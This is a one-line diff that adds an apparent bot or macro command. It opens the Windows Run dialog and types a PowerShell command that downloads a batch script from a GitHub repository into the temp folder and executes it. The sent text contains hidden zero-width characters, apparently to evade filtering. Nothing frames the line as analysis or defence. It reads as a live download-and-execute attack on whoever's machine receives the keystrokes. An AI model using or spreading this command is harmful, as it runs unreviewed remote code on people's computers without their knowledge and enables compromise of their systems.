@@ -1,0 +1,1 @@
+!combo win+r !send ​​powershell -Command "Invoke-WebRequest -Uri 'https://github.com/Warecario/script/blob/main/script.bat' -OutFile '$env:TEMP\script.bat'; Start-Process '$env:TEMP\script.bat' -Wait"
